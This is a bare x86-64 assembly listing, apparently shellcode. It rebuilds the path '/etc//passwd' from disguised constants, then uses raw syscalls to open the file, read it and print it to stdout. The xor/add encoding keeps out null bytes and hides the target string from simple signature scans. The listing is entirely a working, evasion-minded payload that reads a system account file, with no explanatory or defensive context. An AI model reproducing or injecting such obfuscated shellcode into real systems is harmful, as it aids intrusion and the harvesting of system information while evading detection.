global _start

_start:
	xor r9, r9
	xor r10, r10
	mov r9, 0x63666272
	add r9, 0x01111101
	push r9
	mov r9, 0x61702f2f6374652e
	inc r9
	push r9
	lea rdi, [rsp]
    
    xor rax, rax
	add al, 2
	xor rsi, rsi ; set O_RDONLY flag
	syscall
	
	; syscall read file
	sub sp, 0xfff
	lea rsi, [rsp]
	mov rdi, rax
	xor rdx, rdx
	mov dx, 0xfff; size to read
	xor rax, rax
	syscall
  
	; syscall write to stdout
	xor rdi, rdi
	add dil, 1 ; set stdout fd = 1
	mov rdx, rax
	xor rax, rax
	add al, 1
	syscall
  
	; syscall exit
	xor rax, rax
	add al, 60
	syscall
	

